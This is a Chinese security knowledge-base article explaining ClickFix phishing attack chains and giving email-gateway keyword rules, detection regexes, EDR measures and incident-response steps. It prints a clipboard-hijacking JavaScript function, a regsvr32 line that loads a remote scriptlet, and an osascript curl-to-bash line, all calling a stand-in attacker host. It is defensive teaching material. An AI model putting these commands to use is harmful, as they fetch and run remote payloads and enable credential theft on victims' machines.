# 钓鱼邮件 ClickFix 攻击链检测与防御指南

> 原文: https://www.ztpop.net/kb/clickfix-email-attack-detection-guide.html  
> 发布: 2026-08-07

钓鱼邮件 ClickFix 攻击链检测与防御指南
基于 Microsoft/CyberProof/Halcon 2026 威胁情报的实战检测规则

发布于 2026-08-07

## ClickFix 攻击是什么

ClickFix（又名「ClickFix Loader」或「HTML Smiat」）是一种社会工程学攻击技术，攻击者通过伪造软件错误提示或安全警告，诱导用户手动执行恶意命令，从而在受害主机上下载并执行恶意载荷。与传统钓鱼攻击依赖恶意附件或链接不同，ClickFix 的核心特征是**「诱导用户自己动手执行攻击命令」**，这一特点使其能够有效绕过大多数邮件安全网关的静态检测和沙箱分析。

根据 Microsoft Security（2026-03）和 CyberProof（2026-04）的威胁情报，ClickFix 自 2026 年 3 月起进入爆发期，已成为 Qilin、Termite、Interlock、LeakNet 等多个勒索软件家族的通用初始访问手段。2026 年 2 月披露的 MacSync 变种开始针对 Mac 用户，形成跨平台攻击能力。

## 攻击链详解：四步完成主机沦陷

### Step 1：伪装页面诱导（社会工程层）

攻击者发送钓鱼邮件或水坑攻击，在网页中嵌入伪造的「Adobe PDF Reader 需要更新」「Chrome 字体缺失」「Word 文档安全警告」等虚假错误提示。典型话术包括：

  - 「Your PDF viewer is out of date. Please update it to view this document.」

  - 「This document contains macros that require your attention. Click the button below to enable editing.」

  - 「An error occurred while loading fonts. Please copy and run the command below to fix it.」

  - 「Your session has expired. To verify your identity, run the following command:」

国内变种还常出现中文版本，如「您的浏览器版本过低，请复制以下命令到运行窗口进行修复」。

### Step 2：剪贴板命令注入（剪贴板劫持）

伪造页面的关键特征是包含一段隐藏的命令文本。当用户点击「修复」按钮后，页面通过 JavaScript 将恶意命令注入系统剪贴板，覆盖用户原本复制的内容。用户随后被引导到运行窗口（Windows+R）或命令提示符（cmd.exe）中粘贴执行。

核心 JavaScript 手法：

// 劫持剪贴板，注入恶意命令
function copyMaliciousCmd() {
  navigator.clipboard.writeText(
    'cmdkey /add:targetserver:4444 /user:admin /pass:P@ssw0rd123 & regsvr32 /s /n /u /i:http://attacker.site/payload.sct scrobj.dll'
  );
  document.execCommand('paste');
}

### Step 3：命令链执行（凭据窃取 + 载荷下载）

根据 CyberProof 2026 年 4 月报告，2026 年 ClickFix 变种已从早期 PowerShell 执行演变为更隐蔽的命令链：

#### Windows 凭据存储（cmdkey）

```
`cmdkey /add:&lt;attacker_server&gt; /user:&lt;username&gt; /pass:&lt;password&gt;`
```
此命令将攻击者控制的服务器凭据添加到本地凭据存储，为后续的远程桌面（RDP）或 SMB 横向移动做准备。

#### 远程 DLL 执行（regsvr32）

```
`regsvr32 /s /n /u /i:http://attacker.site/payload.sct scrobj.dll`
```
regsvr32 绕过 AppLocker 白名单限制，通过远程 SCT 文件下载并执行 JScript/VBScript 代码。该技术又名「Squiblydoo」攻击变体，被 MITRE ATT&amp;CK 收录为 T1218.010（System Binary Proxy Execution: regsvr32）。

#### Windows Terminal 快捷键绕过（2026 新变种）

微软 2026 年 3 月披露，攻击者开始使用 Win+X I 快捷键启动 Windows Terminal（wt.exe）替代传统的运行对话框。该技术可绕过部分 EDR 对「打开运行对话框」行为的监控。

# 攻击者诱导页面执行的命令
cmd /c start wt.exe  # 打开 Windows Terminal

#### Mac 变种：AppleScript 动态载荷

MacSync 攻击（2026 年 2 月全球活动）针对 Mac 用户：攻击邮件伪装成 iCloud/OneDrive 同步通知，诱导用户复制并执行 AppleScript 命令。载荷在内存中执行，窃取浏览器凭据、Cookie 和加密货币钱包数据。

# MacSync 攻击中使用的 AppleScript 载荷（概念演示）
osascript -e 'do shell script "curl -s http://attacker.site/mac_payload | bash"'

### Step 4：后门植入与持久化

载荷执行后，攻击者获得目标主机的远程控制权限。根据攻击者背景不同，可能部署勒索软件、数据窃取木马或持久性后门。

## 邮件网关检测规则设计

### 检测原则

ClickFix 的核心挑战在于：攻击载荷不随邮件传输，而是通过社会工程手段「借道」用户执行。因此邮件安全网关的检测重心应放在**社会工程话术特征**和**命令链结构特征**两个维度。

### 维度一：话术特征检测

钓鱼邮件中包含以下诱导话术关键词组合时，应触发高风险告警：

  关键词类别典型词例权重
  
    修复指令复制到运行、复制以下命令、运行此命令、执行以下命令、fix it、run this command高
    软件更新诱导PDF viewer out of date、Chrome 需要更新、Adobe 已过期、font missing、字体缺失高
    安全验证话术verify your identity、验证身份、session expired、会话已过期、验证码中
    紧急施压immediately、立即、urgent、紧急、your account will be locked中
    命令提示符cmd /c、powershell -Command、regsvr32、cmdkey极高
  

### 维度二：命令链结构检测（正则匹配）

# cmdkey 凭据窃取
regex: /cmdkey\s+\/add:/i

# regsvr32 远程 DLL 加载（绕过 AppLocker）
regex: /regsvr32\s+.*\/(?:s|n|u)/i
regex: /regsvr32\s+.*\/i:http/i

# PowerShell 远程载荷下载
regex: /powershell.*(?:IEX|Invoke-Expression)\s+-enc/i
regex: /powershell.*(?:WebClient|Net\.WebClient|DownloadString)/i

# Windows Terminal wt.exe 启动
regex: /\bwt\.exe\b/i

# cscript/wscript 脚本引擎
regex: /cscript|wscript.*\.vbs|\.jse/i

# Mac AppleScript
regex: /osascript|do shell script/i

# MSHTA 远程脚本
regex: /mshta\s+http/i

### 维度三：邮件正文行为检测

  - **剪贴板劫持页面识别**：邮件正文或正文中引用的网页包含 `navigator.clipboard`、`execCommand('paste')` 等 JS 关键词

  - **超链接指向本地协议**：链接使用 `javascript:`、`vbscript:` 或指向 `file://` 而非 https 页面

  - **短时间大量外发**：同一发件账户短时间内向大量外部地址发送含诱导话术的邮件（可能为攻击者利用被控账户）

  - **From 欺骗**：显示名与实际发件域不一致，结合邮件认证状态（SPF/DKIM/DMARC 全部 fail）

## 企业防御策略

### 技术层

  - **邮件网关规则**：在邮件安全网关中部署上述正则规则，对包含命令链结构特征的入站邮件进行标记或隔离；对 HTML 邮件中的剪贴板 API 调用行为进行 JS 执行前静态分析

  - **终端防护**：在 EDR/XDR 中添加 cmdkey.exe、regsvr32.exe 的父进程链监控——正常用户操作不会直接调用这些工具；添加 regsvr32.exe 的网络出站行为告警

  - **浏览器隔离**：对邮件中的外部链接使用远程浏览器隔离（RBI）打开，防止伪造页面劫持剪贴板

  - **AppLocker/WDAC**：对 regsvr32.exe 设置脚本执行策略限制，防止通过 SCT 文件执行远程代码

### 人员层

  - **安全意识培训**：培训员工识别 ClickFix 典型话术——「复制到运行」「执行以下命令」「修复错误」是核心识别词

  - **零信任原则**：任何要求用户在本地执行命令的操作，无论来源是邮件、网页还是即时通讯，一律视为可疑

  - **模拟演练**：使用合法平台定期进行 ClickFix 场景的钓鱼演练，测试员工识别能力

### 检测与响应

如果发现疑似 ClickFix 攻击事件，按以下步骤响应：

  - **隔离**：立即断开除网络外的受害主机，防止横向移动

  - **凭据重置**：重置所有可能泄露的账户凭据，尤其关注 cmdkey 添加的凭据

  - **日志分析**：提取邮件网关日志，溯源攻击邮件的发送者账户；检查终端 EDR 日志，查找 regsvr32/PowerShell 执行痕迹

  - **通知**：向全体员工发送安全预警，提示同类攻击的后续变种

## 参考情报来源

  - Microsoft Security Blog, *Threat Intelligence Profile: ClickFix*, 2026-03

  - CyberProof, *ClickFix Loader: From Social Engineering to Ransomware*, 2026-04

  - Halcyon Research, *ClickFix Campaign Analysis Q1-Q2 2026*

  - MITRE ATT&amp;CK, *T1218.010 System Binary Proxy Execution: regsvr32*

  - Trend Micro, *MacSync: New Mac-Targeted ClickFix Variant*, 2026-02

### 参考文献

  - Microsoft Security Blog, *Threat Intelligence Profile: ClickFix*, 2026-03, [https://www.microsoft.com/en-us/security/blog/](https://www.microsoft.com/en-us/security/blog/tag/Threat-Intelligence/)

  - CyberProof, *ClickFix Loader: From Social Engineering to Ransomware*, 2026-04, [https://www.cyberproof.com/blog](https://www.cyberproof.com/blog)

  - Halcyon Research, *ClickFix Campaign Analysis Q1-Q2 2026*, 2026, [https://halcyon.ai/research](https://halcyon.ai/research)

  - MITRE ATT&amp;CK, *T1218.010 System Binary Proxy Execution: regsvr32*, [https://attack.mitre.org/techniques/T1218/010/](https://attack.mitre.org/techniques/T1218/010/)

  - Trend Micro, *MacSync: New Mac-Targeted ClickFix Variant*, 2026-02, [https://www.trendmicro.com/en_us/research/26/b/macsync-clickfix-mac.html](https://www.trendmicro.com/en_us/research/26/b/macsync-clickfix-mac.html)

ztpop.net 知识库编辑. "[钓鱼邮件 ClickFix 攻击链检测与防御指南](https://www.ztpop.net/kb/clickfix-email-attack-detection-guide)" *ztpop.net 知识库*.

可自由引用，仅需标注来源 ztpop.net

    
      
### 相关主题

      
        - [邮件安全 AI 检测工具](/ai-mail-detect.html)：AI 驱动的钓鱼/BEC/社会工程攻击检测，支持 ClickFix 诱导话术分析

        - [邮件伪造风险评估器](/tools/spoof-risk-checker.html)：检测 From 欺骗攻击，识别显示名与实际发件域不一致的钓鱼邮件

        - [AI 钓鱼邮件检测技术指南](/kb/ai-phishing-detection-2026.html)：机器学习/深度学习在钓鱼邮件识别中的应用，含图片钓鱼检测

      
    

本文由 ztpop.net 知识库编辑发布，如需引用请注明来源。

可自由引用，仅需标注来源 ztpop.net

---
*本文由 ztpop.net 知识库编辑翻译整理，CC-BY 4.0 许可。*
